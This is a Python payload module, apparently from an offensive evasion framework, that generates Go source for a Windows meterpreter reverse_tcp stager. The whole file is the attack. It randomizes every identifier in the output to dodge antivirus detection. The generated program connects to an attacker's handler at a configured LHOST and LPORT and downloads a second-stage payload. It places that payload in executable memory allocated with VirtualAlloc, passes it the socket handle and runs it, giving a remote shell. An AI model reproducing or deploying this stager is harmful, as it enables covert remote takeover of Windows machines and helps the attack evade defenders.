"""

Custom-written pure go meterpreter/reverse_tcp stager.


Module built by @b00stfr3ak44

"""

from modules.common import helpers


class Payload:

    def __init__(self):
        # required options
        self.description = "pure windows/meterpreter/reverse_tcp stager, no shellcode"
        self.language = "Go"
        self.extension = "go"
        self.rating = "Normal"

        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {
                                    "LHOST"          : ["", "IP of the Metasploit handler"],
                                    "LPORT"          : ["4444", "Port of the Metasploit handler"],
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"]
                                }
    def generate(self):
        memCommit = helpers.randomString()
        memReserve = helpers.randomString()
        pageExecRW = helpers.randomString()
        kernel32 = helpers.randomString()
        procVirtualAlloc = helpers.randomString()
        virtualAlloc = helpers.randomString()
        size = helpers.randomString()
        addr = helpers.randomString()
        err = helpers.randomString()
        wsadata = helpers.randomString()
        socket = helpers.randomString()
        socketAddr = helpers.randomString()
        ip = self.required_options["LHOST"][0].split('.')
        buf = helpers.randomString()
        dataBuf = helpers.randomString()
        flags = helpers.randomString()
        qty = helpers.randomString()
        scLength = helpers.randomString()
        sc = helpers.randomString()
        sc2 = helpers.randomString()
        total = helpers.randomString()
        mem = helpers.randomString()
        buffer = helpers.randomString()
        handle = helpers.randomString()
        x = helpers.randomString()
        value = helpers.randomString()

        payloadCode = "package main\nimport (\n\"encoding/binary\"\n\"syscall\"\n\"unsafe\"\n)\n"
        payloadCode += "const (\n"
        payloadCode += "%s  = 0x1000\n" %(memCommit)
        payloadCode += "%s = 0x2000\n" %(memReserve)
        payloadCode += "%s  = 0x40\n)\n" %(pageExecRW)

        payloadCode += "var (\n"
        payloadCode += "%s    = syscall.NewLazyDLL(\"kernel32.dll\")\n" %(kernel32)
        payloadCode += "%s = %s.NewProc(\"VirtualAlloc\")\n)\n" %(procVirtualAlloc, kernel32)

        payloadCode += "func %s(%s uintptr) (uintptr, error) {\n" %(virtualAlloc, size)
        payloadCode += "%s, _, %s := %s.Call(0, %s, %s|%s, %s)\n" %(addr, err, procVirtualAlloc, size, memReserve, memCommit, pageExecRW)
        payloadCode += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" %(addr, err, addr)

        payloadCode += "func main() {\n"
        payloadCode += "var %s syscall.WSAData\n" %(wsadata)
        payloadCode += "syscall.WSAStartup(uint32(0x202), &%s)\n" %(wsadata)
        payloadCode += "%s, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n" %(socket)
        payloadCode += "%s := syscall.SockaddrInet4{Port: %s, Addr: [4]byte{%s, %s, %s, %s}}\n" %(socketAddr, self.required_options["LPORT"][0], ip[0], ip[1], ip[2], ip[3])
        payloadCode += "syscall.Connect(%s, &%s)\n" %(socket, socketAddr)
        payloadCode += "var %s [4]byte\n" %(buf)
        payloadCode += "%s := syscall.WSABuf{Len: uint32(4), Buf: &%s[0]}\n" %(dataBuf, buf)
        payloadCode += "%s := uint32(0)\n" %(flags)
        payloadCode += "%s := uint32(0)\n" %(qty)
        payloadCode += "syscall.WSARecv(%s, &%s, 1, &%s, &%s, nil, nil)\n" %(socket, dataBuf, qty, flags)
        payloadCode += "%s := binary.LittleEndian.Uint32(%s[:])\n" %(scLength, buf)
        payloadCode += "%s := make([]byte, %s)\n" %(sc, scLength)
        payloadCode += "var %s []byte\n" %(sc2)
        payloadCode += "%s = syscall.WSABuf{Len: %s, Buf: &%s[0]}\n" %(dataBuf, scLength, sc)
        payloadCode += "%s = uint32(0)\n" %(flags)
        payloadCode += "%s = uint32(0)\n" %(qty)
        payloadCode += "%s := uint32(0)\n" %(total)
        payloadCode += "for %s < %s {\n" %(total, scLength)
        payloadCode += "syscall.WSARecv(%s, &%s, 1, &%s, &%s, nil, nil)\n" %(socket, dataBuf, qty, flags)
        payloadCode += "for i := 0; i < int(%s); i++ {\n" %(qty)
        payloadCode += "%s = append(%s, %s[i])\n}\n%s += %s\n}\n" %(sc2, sc2, sc, total, qty)
        payloadCode += "%s, _ := %s(uintptr(%s + 5))\n" %(mem, virtualAlloc, scLength)
        payloadCode += "%s := (*[900000]byte)(unsafe.Pointer(%s))\n" %(buffer, mem)
        payloadCode += "%s := (uintptr)(unsafe.Pointer(%s))\n" %(handle, socket)
        payloadCode += "%s[0] = 0xBF\n" %(buffer)
        payloadCode += "%s[1] = byte(%s)\n" %(buffer, handle)
        payloadCode += "%s[2] = 0x00\n" %(buffer)
        payloadCode += "%s[3] = 0x00\n" %(buffer)
        payloadCode += "%s[4] = 0x00\n" %(buffer)
        payloadCode += "for %s, %s := range %s {\n" %(x, value, sc2)
        payloadCode += "%s[%s+5] = %s\n}\n" %(buffer, x, value)
        payloadCode += "syscall.Syscall(%s, 0, 0, 0, 0)\n}\n" %(mem)
        return payloadCode
